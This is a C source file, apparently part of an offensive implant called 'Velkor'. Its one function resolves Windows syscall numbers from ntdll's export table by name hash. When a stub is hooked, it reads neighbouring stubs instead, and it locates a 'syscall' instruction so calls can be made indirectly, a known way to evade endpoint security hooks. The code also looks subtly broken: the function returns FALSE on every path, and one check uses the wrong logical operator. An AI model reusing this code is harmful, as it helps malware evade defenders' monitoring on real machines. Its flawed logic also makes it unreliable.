#include <Velkor.h>

#ifndef _M_IX86

D_SEC( B ) BOOL RetrieveSyscall(
    _In_  ULONG       InpHash, 
    _Out_ PVK_SYSCALL VkSyscall 
) {
    VELKOR_INSTANCE

    if ( !InpHash || !VkSyscall ) return FALSE;

    VkSyscall->FuncHash = InpHash;

    PIMAGE_NT_HEADERS       Header       = { 0 };
    PIMAGE_EXPORT_DIRECTORY Export       = { 0 };
    PDWORD                  ArrayOfFuncs = NULL;
    PDWORD                  ArrayOfNames = NULL;
    PWORD                   ArrayOfOrds  = NULL;
    PVOID                   FuncAddr     = NULL;

    Header   = (PIMAGE_NT_HEADERS)( B_PTR( Velkor->VkWin32.Module[eNtdll] ) + ( (PIMAGE_DOS_HEADER)Velkor->VkWin32.Module[eNtdll] )->e_lfanew );
    Export   = (PIMAGE_EXPORT_DIRECTORY)( B_PTR( Velkor->VkWin32.Module[eNtdll] ) + Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    ArrayOfNames = (PDWORD)( B_PTR( Velkor->VkWin32.Module[eNtdll] ) + Export->AddressOfNames );
    ArrayOfFuncs = (PDWORD)( B_PTR( Velkor->VkWin32.Module[eNtdll] ) + Export->AddressOfFunctions );
    ArrayOfOrds  = (PWORD )( B_PTR( Velkor->VkWin32.Module[eNtdll] ) + Export->AddressOfNameOrdinals );

    for ( INT i = 0; i < Export->NumberOfNames; i++ ) {

        PCHAR NamePtr    = A_PTR( B_PTR( Velkor->VkWin32.Module[eNtdll] ) + ArrayOfNames[i] );
        PVOID FuncionPtr = C_PTR( B_PTR( Velkor->VkWin32.Module[eNtdll] ) + ArrayOfFuncs[ArrayOfOrds[i]] );

        if ( XPR( NamePtr ) == InpHash) {

            VkSyscall->FuncAddress = FuncionPtr;

            if (   C_DEF64( FuncionPtr ) == 0x4C
                && C_DEF64( FuncionPtr + 1 ) == 0x8B
                && C_DEF64( FuncionPtr + 2 ) == 0xD1
                && C_DEF64( FuncionPtr + 3 ) == 0xB8
                && C_DEF64( FuncionPtr + 6 ) == 0x00
                && C_DEF64( FuncionPtr + 7 ) == 0x00
            ) {

                BYTE High = C_DEF64( FuncionPtr + 5 );
                BYTE Low  = C_DEF64( FuncionPtr + 4 );
                VkSyscall->Ssn = ( High << 8 ) | Low;
                break; // break for-loop [i]
            }

            if ( C_DEF64( FuncionPtr ) == 0xE9 ) {

                for ( INT idx = 1; idx <= RANGE; idx++ ) {

                    if (   C_DEF64( FuncionPtr + idx * DOWN ) == 0x4C
                        && C_DEF64( FuncionPtr + 1 + idx * DOWN ) == 0x8B
                        && C_DEF64( FuncionPtr + 2 + idx * DOWN ) == 0xD1
                        && C_DEF64( FuncionPtr + 3 + idx * DOWN ) == 0xB8
                        && C_DEF64( FuncionPtr + 6 + idx * DOWN ) == 0x00
                        && C_DEF64( FuncionPtr + 7 + idx * DOWN ) == 0x00
                    ) {
                        BYTE High = C_DEF64( FuncionPtr + 5 + idx * DOWN );
                        BYTE Low  = C_DEF64( FuncionPtr + 4 + idx * DOWN );
                        VkSyscall->Ssn = ( High << 8 ) | Low - idx;
                        break; // break for-loop [idx]
                    }

                    if (   C_DEF64( FuncionPtr + idx * UP ) == 0x4C
                        && C_DEF64( FuncionPtr + 1 + idx * UP ) == 0x8B
                        && C_DEF64( FuncionPtr + 2 + idx * UP ) == 0xD1
                        && C_DEF64( FuncionPtr + 3 + idx * UP ) == 0xB8
                        && C_DEF64( FuncionPtr + 6 + idx * UP ) == 0x00
                        && C_DEF64( FuncionPtr + 7 + idx * UP ) == 0x00 
                    ) {
                        BYTE High = C_DEF64( FuncionPtr + 5 + idx * UP );
                        BYTE Low  = C_DEF64( FuncionPtr + 4 + idx * UP );
                        VkSyscall->Ssn = ( High << 8 ) | Low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            if ( C_DEF64( FuncionPtr + 3 ) == 0xE9 ) {

                for ( INT idx = 1; idx <= RANGE; idx++ ) {

                    if (   C_DEF64( FuncionPtr + idx * DOWN ) == 0x4C
                        && C_DEF64( FuncionPtr + 1 + idx * DOWN ) == 0x8B
                        && C_DEF64( FuncionPtr + 2 + idx * DOWN ) == 0xD1
                        && C_DEF64( FuncionPtr + 3 + idx * DOWN ) == 0xB8
                        && C_DEF64( FuncionPtr + 6 + idx * DOWN ) == 0x00
                        && C_DEF64( FuncionPtr + 7 + idx * DOWN ) == 0x00
                    ) {
                        BYTE High = C_DEF64( FuncionPtr + 5 + idx * DOWN );
                        BYTE Low  = C_DEF64( FuncionPtr + 4 + idx * DOWN );
                        VkSyscall->Ssn = ( High << 8 ) | Low - idx;
                        break; // break for-loop [idx]
                    }

                    if (   C_DEF64( FuncionPtr + idx * UP ) == 0x4C
                        && C_DEF64( FuncionPtr + 1 + idx * UP ) == 0x8B
                        && C_DEF64( FuncionPtr + 2 + idx * UP ) == 0xD1
                        && C_DEF64( FuncionPtr + 3 + idx * UP ) == 0xB8
                        && C_DEF64( FuncionPtr + 6 + idx * UP ) == 0x00
                        && C_DEF64( FuncionPtr + 7 + idx * UP ) == 0x00
                    ) {
                        BYTE High = C_DEF64( FuncionPtr + 5 + idx * UP );
                        BYTE Low  = C_DEF64( FuncionPtr + 4 + idx * UP );
                        VkSyscall->Ssn = ( High << 8 ) | Low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]
        }
    }

    if ( !VkSyscall->FuncAddress ) return FALSE;

    UINT64 uFuncAddress = U_64( U_64( VkSyscall->FuncAddress ) + 0xFF );

    for ( INT z = 0, x = 1; z <= RANGE; z++, x++) {
        if ( C_DEF64( uFuncAddress + z ) == 0x0F && C_DEF64( ( uFuncAddress ) + x ) == 0x05 ) {
            VkSyscall->SyscallAddress = C_PTR( U_64( uFuncAddress ) + z ); break;
        }
    }

    if ( !VkSyscall->Ssn && !VkSyscall->FuncAddress && !VkSyscall->FuncHash && !VkSyscall->SyscallAddress ) return FALSE;
    
    return FALSE;
}

#endif // _M_IX86
